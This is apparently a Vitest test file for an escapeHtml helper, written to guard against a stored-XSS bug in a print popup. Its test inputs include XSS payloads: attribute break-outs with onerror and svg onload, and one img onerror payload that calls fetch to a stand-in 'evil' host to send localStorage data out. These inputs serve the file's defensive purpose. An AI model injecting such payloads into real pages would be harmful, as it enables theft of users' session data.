import { describe, it, expect } from 'vitest'
import { escapeHtml, rawHtml } from './escapeHtml'

describe('escapeHtml', () => {
  it('neutralises the characters that can start a tag or an attribute break-out', () => {
    expect(escapeHtml('<script>')).toBe('&lt;script&gt;')
    expect(escapeHtml('" onerror="alert(1)')).toBe('&quot; onerror=&quot;alert(1)')
    expect(escapeHtml("' onerror='alert(1)")).toBe('&#39; onerror=&#39;alert(1)')
  })

  it('escapes the ampersand first so it does not double-escape its own output', () => {
    expect(escapeHtml('&lt;')).toBe('&amp;lt;')
    expect(escapeHtml('a & b')).toBe('a &amp; b')
    // The regression this guards: an implementation that replaced & last would
    // turn this into "&amp;lt;" *correctly* but "&amp;amp;lt;" if it re-escaped.
    expect(escapeHtml('&<>"\'')).toBe('&amp;&lt;&gt;&quot;&#39;')
  })

  it('leaves ordinary text untouched, so reports stay readable', () => {
    expect(escapeHtml('2024 Toyota Land Cruiser')).toBe('2024 Toyota Land Cruiser')
    expect(escapeHtml('مرحبا')).toBe('مرحبا')
  })

  it('renders null and undefined as empty rather than "null"', () => {
    expect(escapeHtml(null)).toBe('')
    expect(escapeHtml(undefined)).toBe('')
  })

  it('stringifies non-strings without emitting [object Object] unescaped', () => {
    expect(escapeHtml(42)).toBe('42')
    // An object whose toString returns markup must still be escaped.
    expect(escapeHtml({ toString: () => '<b>' })).toBe('&lt;b&gt;')
  })

  // The vector that made this exploitable in the first place: a stored username
  // rendered into a same-origin print popup.
  it('renders a stored XSS payload as inert text', () => {
    const payload = `<img src=x onerror="fetch('//evil/?'+localStorage.user)">`
    const out = escapeHtml(payload)

    expect(out).not.toContain('<img')
    expect(out).toContain('&lt;img')
    expect(out).toContain('&quot;')
  })

  it('handles a payload that tries to close the attribute and open a new tag', () => {
    expect(escapeHtml('"><svg onload=alert(1)>')).toBe('&quot;&gt;&lt;svg onload=alert(1)&gt;')
  })
})

describe('rawHtml', () => {
  it('is an identity function, so trusted markup survives', () => {
    const cell = '<td class="amount">1,000.00</td>'
    expect(rawHtml(cell)).toBe(cell)
  })

  it('returns non-strings untouched, for pre-built fragments', () => {
    expect(rawHtml(null)).toBe(null)
    expect(rawHtml(0)).toBe(0)
  })
})
